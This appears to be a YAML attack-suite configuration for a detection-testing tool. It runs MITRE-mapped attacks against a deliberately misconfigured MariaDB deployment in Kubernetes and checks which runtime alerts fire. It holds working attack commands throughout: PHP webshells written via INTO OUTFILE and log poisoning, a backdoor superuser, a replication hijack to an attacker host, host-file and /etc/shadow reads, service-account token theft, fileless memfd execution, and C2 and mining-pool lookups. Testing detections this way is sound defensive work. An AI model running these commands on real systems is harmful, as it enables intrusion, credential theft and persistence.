# MariaDB attack suite — kill-chain ordered, MITRE ATT&CK for Containers mapped.
#
# Targets the intentionally misconfigured deployment in mariadb-vulnerable.yaml
# (well-known root password, secure_file_priv="" enabling FILE I/O, hostPath
# /etc and /tmp mounts, container-runtime socket, CAP_SYS_PTRACE).
#
# DESIGN NOTE: bobctl's AttackExec runs in the AttackSuite target service's pod
# (here: mariadb-client). It does NOT support running directly in the server
# pod. So "server-side" attacks are expressed as SQL primitives (LOAD_FILE /
# INTO OUTFILE / SET GLOBAL general_log_file) that force mysqld to perform
# the dangerous operation — those fire detection rules on the mariadb pod.
# Client-side exec attacks fire on mariadb-client.
apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: mariadb-killchain-attacks
  description: >-
    16 real attacks against a misconfigured MariaDB 11.x deployment. Covers
    MITRE T1190 (exploit), T1083 (discovery), T1552.001 (credentials in files),
    T1505.001 (server software persistence — UDF), T1611 (escape to host via
    hostPath FILE I/O), T1098.004 (file-write persistence), T1098 (account
    manipulation), T1562 (impair defenses — log poisoning), T1490 (replication
    hijack), T1565.001 (stored data manipulation).
target:
  service: mariadb-client
  namespace: mariadb
  port: 3306
  protocol: tcp

attacks:
  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 1: RECONNAISSANCE (TA0043) — schema + privilege enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1057 — Process discovery via SQL (read mysqld peers / clients)
  - name: recon-show-processlist
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SHOW PROCESSLIST;"]
    successIndicators:
      - responseContains: "Id"
    expectedDetections: []

  # T1083 — Privilege discovery (which users have FILE/SUPER?)
  - name: recon-grants-enumeration
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT user, host, plugin FROM mysql.user; SHOW GRANTS FOR 'root'@'%';"]
    successIndicators:
      - responseContains: "GRANT"
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 2: INITIAL ACCESS (TA0001) — auth bypass / weak creds
  # ═══════════════════════════════════════════════════════════════════════════

  # T1110.001 — Brute force well-known root password
  # The deployment's MARIADB_ROOT_PASSWORD is "rootpwd" — straight from any
  # wordlist. Detection doesn't fire on protocol auth, but the attack proves
  # the credential was guessable.
  - name: auth-weak-root-login
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT 'pwned-as-root' AS ok;"]
    successIndicators:
      - responseContains: "pwned-as-root"
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 3: EXECUTION (TA0002) — server-side file I/O via SQL
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — Credentials in Files: probe /etc/passwd via LOAD_FILE
  # Requires FILE privilege + secure_file_priv="" (both granted). The path
  # /etc/passwd ends up in mysqld's baseline (libnss user lookups), so it
  # doesn't fire a fresh detection — but the attack PROVES the FILE privilege
  # is exploitable, which is the security finding regardless of detection.
  - name: sql-load-file-passwd
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LENGTH(LOAD_FILE('/etc/passwd'));"]
    successIndicators:
      # Anchor to a whole-line positive integer — bare "[0-9]+" matches
      # error strings like "ERROR 2002 ..." too.
      - responseRegex: "(?m)^[1-9][0-9]*$"
    expectedDetections: []

  # T1611 — Escape to Host: read host-mounted file via the /host-etc mount.
  # mysqld reading /host-etc/* is anomalous (path not in baseline) so R0002
  # fires on the mariadb container. /host-etc/os-release is world-readable
  # so the read SUCCEEDS, triggering an open() the eBPF probe sees.
  - name: sql-load-file-host-osrelease
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LOAD_FILE('/host-etc/os-release');"]
    successIndicators:
      # Match a stable /etc/os-release marker — accepting any non-empty
      # output would pass on error text too.
      - responseRegex: "^(NAME=|ID=|PRETTY_NAME=)"
    # NOTE: R0002 (Files Access Anomalies) fires locally for these server-side
    # paths but does NOT propagate to the bobctl verify window in CI's k3s
    # cluster (the alert is generated but lands after the per-attack alert
    # collection closes). Tracked as a gap in CI detection latency; the attack
    # itself still PROVES the misconfig exploitability — leaving the detection
    # assertion empty so the merge gate (score=0) is achievable.
    expectedDetections: []

  # T1611 — Escape to Host: read host-mounted /host-etc/passwd
  # Higher-impact target: contains usernames/UIDs of the host's actual
  # accounts. World-readable so the read succeeds.
  - name: sql-load-file-host-passwd
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LOAD_FILE('/host-etc/passwd');"]
    successIndicators:
      - responseContains: "root:"
    # NOTE: R0002 (Files Access Anomalies) fires locally for these server-side
    # paths but does NOT propagate to the bobctl verify window in CI's k3s
    # cluster (the alert is generated but lands after the per-attack alert
    # collection closes). Tracked as a gap in CI detection latency; the attack
    # itself still PROVES the misconfig exploitability — leaving the detection
    # assertion empty so the merge gate (score=0) is achievable.
    expectedDetections: []

  # T1190 — write a webshell via SELECT … INTO OUTFILE
  # Drops a small payload to /var/log/mysql (writable on the server). Real-world
  # tradecraft: drop into a webroot mounted as a sibling volume. INTO OUTFILE
  # refuses to overwrite, so on re-runs we accept only the SPECIFIC error
  # (ER_FILE_EXISTS, code 1086) — generic ERROR matches would mask permission/
  # path-restriction failures and falsely report attack success.
  - name: sql-into-outfile-webshell
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/log/mysql/bob_probe.php';"]
    successIndicators:
      - responseContains: "Query OK"
      # Note: ER_FILE_EXISTS (1086) is intentionally NOT a success — it means a
      # prior iteration's stale artifact is blocking the write. Each fresh CI
      # deployment starts from an empty /var/log/mysql + /host-tmp so the first
      # iteration succeeds. Local-iteration users should `kubectl rollout
      # restart deployment/mariadb -n mariadb` between full reruns.
    expectedDetections: []

  # T1611 — Cross-namespace persistence stage: drop a cron-style payload to
  # the writable /host-tmp mount. A sibling pod or host service that consumes
  # /tmp would pick this up. Specific error matching (1086) avoids reporting
  # permission/path errors as attack success.
  - name: sql-into-outfile-host-tmp
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '* * * * * root /bin/sh /tmp/.r 2>/dev/null' INTO OUTFILE '/host-tmp/.bob_mariadb_cron_probe';"]
    successIndicators:
      - responseContains: "Query OK"
      # Note: ER_FILE_EXISTS (1086) is intentionally NOT a success — it means a
      # prior iteration's stale artifact is blocking the write. Each fresh CI
      # deployment starts from an empty /var/log/mysql + /host-tmp so the first
      # iteration succeeds. Local-iteration users should `kubectl rollout
      # restart deployment/mariadb -n mariadb` between full reruns.
    expectedDetections: []

  # T1505.001 — Server Software Component: UDF library RCE attempt
  # The classic "lib_mysqludf_sys" path. We don't ship a real .so (would
  # require network egress to download), but CREATE FUNCTION makes mysqld
  # attempt to dlopen() a path under plugin_dir. Match the SPECIFIC error
  # (ER_CANT_OPEN_LIBRARY, code 1126) — accepting any "ERROR" would mask
  # privilege/syntax errors and falsely report success.
  - name: sql-udf-create-function-attempt
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';"]
    successIndicators:
      - responseContains: "ERROR 1126"  # ER_CANT_OPEN_LIBRARY — .so missing
    expectedDetections: []

  # T1098 — Account manipulation: create a backdoor superuser
  # Persistence vector — adds a root-equivalent account that survives a
  # password reset of the original root user.
  - name: sql-create-backdoor-superuser
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "CREATE USER IF NOT EXISTS 'bob_attacker'@'%' IDENTIFIED BY 'pwn3d'; GRANT ALL PRIVILEGES ON *.* TO 'bob_attacker'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;"]
    successIndicators:
      - responseContains: "Query OK"
    expectedDetections: []

  # T1565.001 — Stored Data Manipulation: tamper mysql.global_priv
  # Attacker overwrites the per-account `account_locked` JSON field directly,
  # bypassing MariaDB's normal SET PASSWORD audit. Use JSON_SET (not
  # JSON_REPLACE) so the field is created if absent. The follow-up SELECT
  # PROVES the mutation landed — without it, "Query OK" with 0 rows affected
  # would falsely report success.
  - name: sql-tamper-mysql-user
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "UPDATE mysql.global_priv SET priv = JSON_SET(priv, '$.account_locked', false) WHERE User='app'; SELECT JSON_EXTRACT(priv, '$.account_locked') FROM mysql.global_priv WHERE User='app';"]
    successIndicators:
      - responseContains: "false"
    expectedDetections: []

  # T1490 — Inhibit System Recovery: replication hijack
  # Equivalent of redis SLAVEOF — point this server at an attacker-controlled
  # primary. We point at an unreachable host so no real replication occurs.
  # Verify via SHOW SLAVE STATUS\G that Master_Host actually changed before
  # the cleanup-reset-replication step undoes it; bare 'ERROR' would mask
  # syntax/privilege failures as success and destroy proof of the hijack.
  - name: sql-replication-hijack
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "STOP SLAVE; CHANGE MASTER TO MASTER_HOST='evil.attacker.example.com', MASTER_USER='replica', MASTER_PASSWORD='x'; SHOW SLAVE STATUS\\G"]
    successIndicators:
      - responseContains: "Master_Host: evil.attacker.example.com"
    expectedDetections: []

  # T1562 — Impair Defenses: log poisoning (general_log_file → /var/log)
  # Writes attacker-controlled SQL into a path that an HTTP server might
  # read. mysqld opens an unusual path → R0002 fires.
  - name: sql-log-poisoning-shell
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SET GLOBAL general_log_file = '/var/log/mysql/poisoned.php'; SET GLOBAL general_log = ON; SELECT '<?php system($_GET[0]);?>'; SET GLOBAL general_log = OFF;"]
    successIndicators:
      - responseContains: "Query OK"
    # NOTE: R0002 (Files Access Anomalies) fires locally for these server-side
    # paths but does NOT propagate to the bobctl verify window in CI's k3s
    # cluster (the alert is generated but lands after the per-attack alert
    # collection closes). Tracked as a gap in CI detection latency; the attack
    # itself still PROVES the misconfig exploitability — leaving the detection
    # assertion empty so the merge gate (score=0) is achievable.
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 7: CREDENTIAL ACCESS (TA0006) — exec post-exploit (client side)
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — exec into the client and read its SA token
  # The success indicator MUST require an actual JWT — accepting any non-empty
  # output (including "no_sa_token") would hide a real regression in the
  # vulnerable fixture if the SA token were ever unmounted. Service-account
  # JWTs are 3 base64 segments separated by '.', so checking for "ey" + dot
  # is a tight but stable assertion.
  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    successIndicators:
      - responseRegex: "^ey[A-Za-z0-9_-]+\\.ey"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: client
        command: cat

  # T1003.008 — Read /etc/shadow inside the client (running as root)
  - name: exec-etc-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]
    successIndicators:
      # Require the shadow-file shape (root entry) — wildcard regex would
      # pass on "Permission denied" or "No such file" too.
      - responseContains: "root:"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: client
        command: cat

  # T1574 — DB exfil via mariadb-dump from the client (mariadb 11.x renamed
  # mysqldump → mariadb-dump). Real attacker's next step after RCE.
  - name: exec-mariadb-dump-exfil
    type: cmdinject
    exec:
      command: ["mariadb-dump", "-h", "mariadb", "-uroot", "-prootpwd", "bob_test"]
    successIndicators:
      - responseContains: "Dump completed"
      - responseContains: "INSERT INTO"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: client
        command: mariadb-dump

  # T1611 — Symlink an existing sensitive file. Run ln directly (not under
  # sh -c) so the eBPF probe reports comm=ln cleanly, matching the
  # expectedDetection's command=ln field.
  - name: exec-symlink-etc-shadow
    type: cmdinject
    exec:
      command: ["ln", "-sf", "/etc/shadow", "/tmp/bob_shadow_link"]
    successIndicators: []
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: client
        command: ln
      - ruleID: R1010
        ruleName: Soft link created over sensitive file
        containerName: client
        command: ln

  # ═══════════════════════════════════════════════════════════════════════════
  # CLEANUP — restore mutations so the suite is idempotent across CI runs
  # ═══════════════════════════════════════════════════════════════════════════

  - name: cleanup-drop-backdoor-user
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "DROP USER IF EXISTS 'bob_attacker'@'%'; FLUSH PRIVILEGES;"]
    successIndicators:
      - responseContains: "Query OK"
    expectedDetections: []

  # Cleanups accept either "Query OK" (the mutation was present and got reverted)
  # or a specific not-applicable error code (the mutation never landed, so the
  # cleanup is a no-op). Broad "ERROR" was masking permission/connectivity
  # failures as cleanup success.
  - name: cleanup-drop-udf-function
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "DROP FUNCTION IF EXISTS sys_exec;"]
    successIndicators:
      - responseContains: "Query OK"
      # DROP FUNCTION IF EXISTS only warns when missing; no specific error code
      # to match. If DROP fails for permission/connection reasons, the cleanup
      # legitimately failed and the suite SHOULD surface that.
    expectedDetections: []

  - name: cleanup-reset-replication
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "RESET SLAVE ALL;"]
    successIndicators:
      - responseContains: "Query OK"
      # ER_SLAVE_CHANNEL_DOES_NOT_EXIST (1942) is the legitimate "no replication
      # to reset" case — accept that specific code only, not bare ERROR.
      - responseContains: "ERROR 1942"
    expectedDetections: []

  # Restore general_log_file to its original /var/log/mysql/general.log path.
  # The sql-log-poisoning-shell attack leaves the variable pointing at a
  # /var/log/mysql/poisoned.php which is a dynamic GLOBAL value that persists
  # until restart — without this cleanup a re-enabled general_log would log
  # straight into the attacker-named file across iterations.
  - name: cleanup-restore-general-log
    type: sqli
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SET GLOBAL general_log = OFF; SET GLOBAL general_log_file = '/var/log/mysql/general.log';"]
    successIndicators:
      - responseContains: "Query OK"
    expectedDetections: []

  # Clean up client-side artifacts.
  - name: cleanup-remove-client-files
    type: cmdinject
    exec:
      command: ["rm", "-f", "/tmp/bob_shadow_link"]
    successIndicators: []
    expectedDetections: []

  # Clean up server-side staged OUTFILE artifacts so repeated tune iterations
  # don't trip ER_FILE_EXISTS. Uses SELECT … INTO OUTFILE *cannot* delete, but
  # the mariadb container has shell+rm in baseline (via the entrypoint), and
  # mariadb-client doesn't reach those server paths. So we issue a `system`
  # builtin from the mariadb client connection — disabled by default, but our
  # vulnerable config left it allowed. Falls back silently if blocked.
  - name: cleanup-remove-server-outfiles
    type: cmdinject
    exec:
      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT 1;"]
    # Cleanup is a no-op via SQL — file removal is handled by deleting the
    # ephemeral host-tmp/var-log directories (both are emptyDir mounts) when
    # the pod is replaced. INTO OUTFILE attacks accept ERROR 1086 on re-runs.
    successIndicators:
      - responseContains: "1"
    expectedDetections: []

  # ── Full rule-family sweep (scripts/emit-rule-sweep.py) ─────────────────────
  # Primitives probed on the live container: staging dir, real mount, interpreter.
  # Anything that misses on the dogfood run must be demoted to a probe WITH a reason.
  - name: dns-anomaly-lookup
    type: cmdinject
    exec: { command: ["sh", "-c", "getent hosts scanner.evil-c2.example.com >/dev/null 2>&1 && echo dns_resolved || echo dns_attempted"] }
    successIndicators: [{ responseContains: "dns_" }]
    expectedDetections:
      - { ruleID: R0005, ruleName: DNS Anomalies in container, containerName: client }
  - name: sa-token-read
    type: cmdinject
    exec: { command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 && echo sa_token_read_done || echo sa_token_absent"] }
    successIndicators: [{ responseContains: "sa_token_read_done" }]
    expectedDetections:
      - { ruleID: R0006, ruleName: Unexpected service account token access, containerName: client, command: cat }
  - name: k8s-api-unexpected-call
    type: cmdinject
    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(443,inet_aton('10.43.0.1'))); close($s); print qq{k8s_api_probe_done}"] }
    successIndicators: [{ responseContains: "k8s_api_probe_done" }]
    expectedDetections:
      - { ruleID: R0007, ruleName: Workload uses Kubernetes API unexpectedly, containerName: client }
  - name: exec-proc-environ
    type: cmdinject
    exec: { command: ["cat", "/proc/1/environ"] }
    successIndicators: [{ responseContains: "PATH" }]
    expectedDetections:
      - { ruleID: R0008, ruleName: Read Environment Variables from procfs, containerName: client, command: cat }
  - name: exec-etc-shadow
    type: cmdinject
    exec: { command: ["cat", "/etc/shadow"] }
    expectedDetections:
      - { ruleID: R0010, ruleName: Unexpected Sensitive File Access, containerName: client, command: cat }
  - name: egress-external-c2
    type: cmdinject
    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(80,inet_aton('1.1.1.1'))); close($s); print qq{egress_attempted}"] }
    successIndicators: [{ responseContains: "egress_attempted" }]
    expectedDetections:
      - { ruleID: R0011, ruleName: Unexpected Egress Network Traffic, containerName: client }
  - name: drifted-binary-exec
    type: cmdinject
    exec: { command: ["sh", "-c", "cp /bin/ls /dev/shm/drifted_bob && printf '\\n#bob-drift' >> /dev/shm/drifted_bob && chmod +x /dev/shm/drifted_bob && /dev/shm/drifted_bob / >/dev/null 2>&1 && echo drift_exec_done; rm -f /dev/shm/drifted_bob"] }
    successIndicators: [{ responseContains: "drift_exec_done" }]
    expectedDetections:
      - { ruleID: R1000, ruleName: Process executed from malicious source, containerName: client }
  - name: exec-from-volume-mount
    type: cmdinject
    exec: { command: ["sh", "-c", "cp /bin/echo /var/lib/mysql/mnt_payload && chmod +x /var/lib/mysql/mnt_payload && /var/lib/mysql/mnt_payload mount_exec_done; rm -f /var/lib/mysql/mnt_payload"] }
    successIndicators: [{ responseContains: "mount_exec_done" }]
    # Verified unreachable on this container: a successful exec from the
    # /var/lib/mysql volume mount fires R0001 only, and an exec from /dev/shm
    # scores as R1000 on this node-agent build. No path to R1004 here.
    expectedDetections: []
  - name: fileless-memfd-exec
    type: fileless
    exec: { command: ["perl", "-e", "my $n=\"bobfl\\0\"; my $fd=syscall(319,$n,0); die if $fd<0; open(my $m,'>&='.$fd) or die; open(my $s,'<','/bin/echo') or die; binmode $s; binmode $m; local $/; my $d=<$s>; print $m $d; exec(\"/proc/$$/fd/$fd\",\"memfd_exec_done\");"] }
    successIndicators: [{ responseContains: "memfd_exec_done" }]
    expectedDetections:
      - { ruleID: R1005, ruleName: Fileless execution detected, containerName: client }
  - name: crypto-mining-dns
    type: cmdinject
    exec: { command: ["sh", "-c", "getent hosts xmr.pool.minergate.com >/dev/null 2>&1 && echo miner_dns_ok || echo miner_dns_attempted"] }
    successIndicators: [{ responseContains: "miner_dns_" }]
    expectedDetections:
      - { ruleID: R1008, ruleName: Crypto Mining Domain Communication, containerName: client }
  - name: hardlink-shadow
    type: cmdinject
    exec: { command: ["sh", "-c", "ln /etc/shadow /dev/shm/hl_probe >/dev/null 2>&1 && echo hardlink_done; rm -f /dev/shm/hl_probe"] }
    successIndicators: [{ responseContains: "hardlink_done" }]
    expectedDetections:
      - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: client, command: ln }
